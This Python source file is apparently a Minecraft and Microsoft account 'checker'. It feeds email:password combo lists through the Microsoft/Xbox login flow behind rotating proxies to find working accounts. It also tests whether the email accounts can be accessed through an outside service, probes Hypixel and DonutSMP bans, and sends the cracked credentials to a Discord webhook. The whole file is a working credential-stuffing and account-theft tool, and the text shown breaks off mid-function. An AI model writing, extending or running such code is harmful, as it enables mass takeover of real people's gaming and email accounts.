import os
import configparser
import requests
import time
import uuid
import json
import re
import concurrent.futures
import threading
import traceback
import random
import urllib3
import warnings
import sys
import socket
import socks
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
from datetime import datetime, timezone
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from io import StringIO

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

proxylist = []
banproxies = []
proxytype = "'4'"  # Default to proxyless

# Login constants from DonutChkr
CLIENT_ID = "00000000402b5328"
SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
OAUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id={}&response_type=token&redirect_uri={}&scope={}&display=touch&locale=en".format(
    CLIENT_ID, REDIRECT_URI, SCOPE
)

# Statistics
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
fname = ""

def log_exception(exc_type, exc_value, exc_tb):
    with open("logs.txt", "a", encoding="utf-8") as log_file:
        traceback.print_exception(exc_type, exc_value, exc_tb, file=log_file)

sys.excepthook = log_exception

if hasattr(threading, "excepthook"):
    def thread_excepthook(args):
        log_exception(args.exc_type, args.exc_value, args.exc_traceback)
    threading.excepthook = thread_excepthook

RESULTS_DIR = "results"

def ensure_results_folder(combo_file):
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
    folder_name = os.path.splitext(os.path.basename(combo_file))[0] if combo_file else "combined_results"
    folder_path = os.path.join(RESULTS_DIR, folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    return folder_path

def save_result(folder, filename, line):
    with open(os.path.join(folder, filename), "a", encoding="utf-8") as f:
        f.write(line + "\n")

def getproxy():
    if len(proxylist) == 0:
        return None
    if proxytype == "'5'": 
        proxy = random.choice(proxylist)
        # Auto-detect proxy type from format
        if proxy.startswith('http://'):
            return {'http': proxy, 'https': proxy.replace('http://', 'https://')}
        elif '@' in proxy:  # Authenticated proxy
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        else:
            # Default to HTTP
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype == "'1'": 
            return {'http': 'http://' + proxy, 'https': 'http://' + proxy}
        elif proxytype == "'2'": 
            return {'http': 'socks4://' + proxy, 'https': 'socks4://' + proxy}
        elif proxytype == "'3'": 
            return {'http': 'socks5://' + proxy, 'https': 'socks5://' + proxy}
    else:
        return None

def load_config():
    config_path = "config.ini"
    config = configparser.ConfigParser()
    default_settings = {
        "Threads": "10",
        "Max Retries": "5",
        "SaveCapture": "True",
        "Webhook": "",
        "WebhookMessage": """@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>""",
        "Proxyless Ban Check": "False",
        "Auto Scrape Minutes": "5"
    }
    
    # Capture settings
    default_captures = {
        "Hypixel Name": "True",
        "Hypixel Level": "True",
        "First Hypixel Login": "True",
        "Last Hypixel Login": "True",
        "Optifine Cape": "True",
        "Minecraft Capes": "True",
        "Email Access": "True",
        "Hypixel Skyblock Coins": "True",
        "Hypixel Bedwars Stars": "True",
        "Hypixel Ban": "True",
        "Name Change Availability": "True",
        "Last Name Change": "True"
    }
    
    if not os.path.isfile(config_path):
        config["Settings"] = default_settings
        config["Captures"] = default_captures
        with open(config_path, "w") as f:
            config.write(f)
    
    config.read(config_path)
    
    # Ensure all sections exist
    if "Settings" not in config:
        config["Settings"] = default_settings
    if "Captures" not in config:
        config["Captures"] = default_captures
    
    # Fill missing values
    for key, value in default_settings.items():
        if key not in config["Settings"]:
            config["Settings"][key] = value
    
    for key, value in default_captures.items():
        if key not in config["Captures"]:
            config["Captures"][key] = value
    
    with open(config_path, "w") as f:
        config.write(f)
    
    return config

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config_obj = Config()

def str_to_bool(value):
    return str(value).lower() in ('yes', 'true', 't', '1', '1.0')

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, mc_name="", mc_uuid="", mc_token="", ban_status="", ban_reason="", time_left="", ban_id=""):
        self.email = email
        self.password = password
        self.name = name  # Original Minecraft name from main.py logic
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.mc_name = mc_name  # DonutSMP specific
        self.mc_uuid = mc_uuid  # DonutSMP specific
        self.mc_token = mc_token  # DonutSMP specific
        self.ban_status = ban_status  # DonutSMP specific
        self.ban_reason = ban_reason  # DonutSMP specific
        self.time_left = time_left  # DonutSMP specific
        self.ban_id = ban_id  # DonutSMP specific
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        
        # DonutSMP specific info
        if self.mc_name:
            message += f"\nDonutSMP Name: {self.mc_name}"
        if self.ban_status:
            message += f"\nDonutSMP Ban Status: {self.ban_status}"
        if self.ban_reason:
            message += f"\nDonutSMP Ban Reason: {self.ban_reason}"
        if self.time_left:
            message += f"\nDonutSMP Time Left: {self.time_left}"
        if self.ban_id:
            message += f"\nDonutSMP Ban ID: {self.ban_id}"
        
        # Original captures
        if self.hypixl is not None: 
            message += f"\nHypixel: {self.hypixl}"
        if self.level is not None: 
            message += f"\nHypixel Level: {self.level}"
        if self.firstlogin is not None: 
            message += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin is not None: 
            message += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape is not None: 
            message += f"\nOptifine Cape: {self.cape}"
        if self.access is not None: 
            message += f"\nEmail Access: {self.access}"
        if self.sbcoins is not None: 
            message += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars is not None: 
            message += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config_obj.get('hypixelban') is True: 
            message += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged is not None: 
            message += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: 
            message += f"\nLast Name Change: {self.lastchanged}"
        
        return message + "\n============================\n"

    def notify(self):
        global errors
        try:
            webhook = config_obj.get('webhook')
            message = config_obj.get('message')
            if not webhook or not message:
                return
                
            payload = {
                "content": message
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A")
                    .replace("<donutsmp_name>", self.mc_name or "N/A")
                    .replace("<donutsmp_ban_status>", self.ban_status or "N/A")
                    .replace("<donutsmp_ban_reason>", self.ban_reason or "N/A")
                    .replace("<donutsmp_time_left>", self.time_left or "N/A")
                    .replace("<donutsmp_ban_id>", self.ban_id or "N/A"),
                "username": "DONUTSMP-CHECKER"
            }
            requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except:
            pass

    def hypixel(self):
        global errors
        try:
            if config_obj.get('hypixelname') is True or config_obj.get('hypixellevel') is True or config_obj.get('hypixelfirstlogin') is True or config_obj.get('hypixellastlogin') is True or config_obj.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config_obj.get('hypixelname') is True: 
                        self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixellevel') is True: 
                        self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixelfirstlogin') is True: 
                        self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixellastlogin') is True: 
                        self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config_obj.get('hypixelbwstars') is True: 
                        self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config_obj.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: 
            errors += 1

    def optifine(self):
        if config_obj.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: 
                    self.cape = "No"
                else: 
                    self.cape = "Yes"
            except: 
                self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config_obj.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out.get("Success") == 1: 
                    self.access = "True"
                    mfa += 1
                    save_result(f"results/{fname}", "MFA.txt", f"{self.email}:{self.password}")
                else:
                    sfa += 1
                    self.access = "False"
                    save_result(f"results/{fname}", "SFA.txt", f"{self.email}:{self.password}")
            except: 
                self.access = "Unknown"
    
    def namechange(self):
        if config_obj.get('namechange') is True or config_obj.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', 
                                        headers={'Authorization': f'Bearer {self.token}'}, 
                                        proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config_obj.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config_obj.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: 
                            pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: 
                            time.sleep(20)
                        self.namechange()
                except: 
                    pass
                tries += 1
                retries += 1
    
    def ban(self):
        global errors
        if config_obj.get('hypixelban') is True:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        save_result(f"results/{fname}", "Unbanned.txt", f"{self.email}:{self.password}")
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        save_result(f"results/{fname}", "Unbanned.txt", f"{self.email}:{self.password}")
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        save_result(f"results/{fname}", "Banned.txt", f"{self.email}:{self.password}")
                
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned is None:
                        self.banned = "False"
                        save_result(f"results/{fname}", "Unbanned.txt", f"{self.email}:{self.password}")
                
                try:
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], 
                                                   port=int(atsplit[1].split(':')[1]), 
                                                   username=atsplit[0].split(':')[0], 
                                                   password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned is None and c < 1000:
                            time.sleep(.01)
                            c += 1
                        connection.disconnect()
                    except: 
                        pass
                    sys.stderr = original_stderr
                except: 
                    pass
                
                if self.banned is not None: 
                    break
                tries += 1

    def handle(self):
        global hits
        hits += 1
        if screen == "'2'": 
            print(Fore.GREEN + f"Hit: {self.name} | {self.email}:{self.password}")
        
        save_result(f"results/{fname}", "Hits.txt", f"{self.email}:{self.password}")
        
        if self.name != 'N/A':
            try: 
                self.hypixel()
            except: 
                pass
            try: 
                self.optifine()
            except: 
                pass
            try: 
                self.full_access()
            except: 
                pass
            try: 
                self.namechange()
            except: 
                pass
            try: 
                self.ban()
            except: 
                pass
        
        save_result(f"results/{fname}", "Capture.txt", self.builder())
        self.notify()

# DONUTSMP SPECIFIC FUNCTIONS (from DonutChkr.py)
def get_urlPost_sFTTag(session):
    for _ in range(5):
        try:
            text = session.get(OAUTH_URL, timeout=15).text
            match = re.search(r'value=\\?"(.+?)\\?"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sFTTag, session
        except Exception:
            pass
        time.sleep(1)
    raise Exception("Failed to get urlPost or sFTTag")

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    for _ in range(5):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != OAUTH_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
                    pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
                    uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    recovery_data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
                    recovery_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(recovery_url, data=recovery_data, allow_redirects=True)
                    fin_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(fin_url, allow_redirects=True)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, session
                except:
                    pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                return "None", session
        except Exception:
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        time.sleep(1)
    return None, session

def xbox_authenticate(ms_access_token):
    url = "https://user.auth.xboxlive.com/user/authenticate"
    payload = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": ms_access_token
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
    }
    r = requests.post(url, json=payload)
    r.raise_for_status()
    data = r.json()
    xbox_token = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return xbox_token, uhs

def xbox_xsts(xbox_token):
    url = "https://xsts.auth.xboxlive.com/xsts/authorize"
    payload = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbox_token]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    }
    r = requests.post(url, json=payload)
    r.raise_for_status()
    data = r.json()
    xsts_token = data["Token"]
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return xsts_token, uhs

def get_mc_access_token(uhs, xsts_token):
    url = "https://api.minecraftservices.com/authentication/login_with_xbox"
    payload = {
        "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
    }
    r = requests.post(url, json=payload)
    r.raise_for_status()
    return r.json()["access_token"]

def get_mc_profile(mc_access_token):
    url = "https://api.minecraftservices.com/minecraft/profile"
    headers = {"Authorization": f"Bearer {mc_access_token}"}
    r = requests.get(url, headers=headers)
    r.raise_for_status()
    data = r.json()
    return data["name"], data["id"]

def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config, capture_obj=None):
    result = None
    disconnect_message = None
    email, password = combo.split(":", 1)
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, disconnect_message
            try:
                msg = str(packet.json_data)
            except Exception:
                msg = ""
            disconnect_message = msg
            result = "banned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
            nonlocal result
            result = "unbanned"

        connection.connect()
        c = 0
        while result is None and c < 1000:
            time.sleep(0.01)
            c += 1

        if result == "unbanned":
            print(Fore.GREEN + f"[UNBANNED] {combo} | Logged in as {mc_name}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Unbanned.txt", f"{combo} | {mc_name}")
            if config.getboolean("Settings", "SaveCapture"):
                cap = Capture(email, password, "", "", "", "", "DonutSMP - Unbanned", mc_name, mc_uuid, mc_token, "unbanned", "", "", "")
                save_result(folder, "Capture.txt", cap.builder())
            time.sleep(1)
        elif result == "banned":
            if disconnect_message:
                clean = re.sub(r'§.', '', disconnect_message)
                reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
                reason = reason_match.group(1).strip() if reason_match else "banned (unknown reason)"
                time_match = re.search(r'Time Left: ([^\n\\]+)', clean)
                time_left = time_match.group(1).strip() if time_match else ""
                banid_match = re.search(r'Ban ID: ([^\n\\]+)', clean)
                ban_id = banid_match.group(1).strip() if banid_match else ""
                fields = [reason, f"Time Left: {time_left}" if time_left else "", f"Ban ID: {ban_id}" if ban_id else ""]
                output = '.'.join([f for f in fields if f])
                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: {output}" + Style.RESET_ALL)
                save_result(folder, "DonutSMP_Banned.txt", f"{combo} | {mc_name} | {output}")
                if config.getboolean("Settings", "SaveCapture"):
                    cap = Capture(email, password, "", "", "", "", "DonutSMP - Banned", mc_name, mc_uuid, mc_token, "banned", reason, time_left, ban_id)
                    save_result(folder, "Capture.txt", cap.builder())
            else:
                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: banned (no message)" + Style.RESET_ALL)
                save_result(folder, "DonutSMP_Banned.txt", f"{combo} | {mc_name} | Status: banned (no message)")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: unknown error" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: unknown error")
        connection.disconnect()
    except Exception as e:
        error_str = str(e)
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.RED + f"[BAD] {combo} | Status: too many requests" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: too many requests")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
        time.sleep(0.1)

def process_donutsmp_combo(combo, folder, config):
    try:
        email, password = combo.strip().split(":", 1)
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        })
        
        if proxytype != "'4'":
            proxy = getproxy()
            if proxy:
                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
        
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if not token or token == "None":
            print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: invalid credentials or 2FA" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", combo)
            time.sleep(0.1)
            return
        
        try:
            xbox_token, uhs = xbox_authenticate(token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 401:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: Xbox authentication failed (401 Unauthorized)" + Style.RESET_ALL)
            elif e.response.status_code == 429:
                print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: Xbox rate limited (429)" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: Xbox auth error | {e}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: Xbox auth error | {e}")
            time.sleep(0.1)
            return
        
        try:
            xsts_token, uhs = xbox_xsts(xbox_token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 401:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: XSTS failed (401 Unauthorized)" + Style.RESET_ALL)
            elif e.response.status_code == 429:
                print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: XSTS rate limited (429)" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: XSTS error | {e}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: XSTS error | {e}")
            time.sleep(0.1)
            return
        
        try:
            mc_access_token = get_mc_access_token(uhs, xsts_token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: Not a Minecraft/Xbox account or region-locked (403)" + Style.RESET_ALL)
            elif e.response.status_code == 429:
                print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: MC rate limited (429)" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: MC access error | {e}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: MC access error | {e}")
            time.sleep(0.1)
            return
        
        try:
            mc_name, mc_uuid = get_mc_profile(mc_access_token)
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 404:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: No Minecraft profile (account never bought MC)" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: MC profile error | {e}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: MC profile error | {e}")
            time.sleep(0.1)
            return
        
        join_donutsmp_bot(mc_name, mc_uuid, mc_access_token, combo, folder, config)
        
    except Exception as e:
        error_str = str(e)
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.YELLOW + f"[DONUTSMP TRY LATER] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"[TRY LATER] {combo} | Status: error | {error_str}")
        else:
            print(Fore.RED + f"[DONUTSMP BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "DonutSMP_Bad.txt", f"{combo} | Status: error | {error_str}")
        time.sleep(0.1)

# ORIGINAL AUTHENTICATION FUNCTIONS (from main.py)
def authenticate_original(email, password, tries=0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        })
        
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                                         json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, 
                                               "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, 
                                         headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token is not None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
                                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, 
                                             "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, 
                                       headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token is not None:
                        access_token = mc_token_original(session, uhs, xsts_token)
                        if access_token is not None:
                            hit = checkmc_original(session, email, password, access_token)
            except: 
                pass
            if hit == False: 
                validmail(email, password)
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'": 
                print(Fore.RED + f"Bad: {email}:{password}")
    except:
        if tries < maxretries:
            tries += 1
            retries += 1
            authenticate_original(email, password, tries)
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'": 
                print(Fore.RED + f"Bad: {email}:{password}")
    finally:
        session.close()

def mc_token_original(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
                                   headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: 
                    time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            continue

def checkmc_original(session, email, password, token):
    global retries, cpm, checked, xgp, xgpu, other
    while True:
        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', 
                             headers={'Authorization': f'Bearer {token}'}, verify=False)
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu += 1
                cpm += 1
                checked += 1
                if screen == "'2'": 
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password}")
                save_result(f"results/{fname}", "XboxGamePassUltimate.txt", f"{email}:{password}")
                try: 
                    capture_mc_original(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    cap = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                    cap.handle()
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp += 1
                cpm += 1
                checked += 1
                if screen == "'2'": 
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {email}:{password}")
                save_result(f"results/{fname}", "XboxGamePass.txt", f"{email}:{password}")
                capture_mc_original(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked += 1
                cpm += 1
                capture_mc_original(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
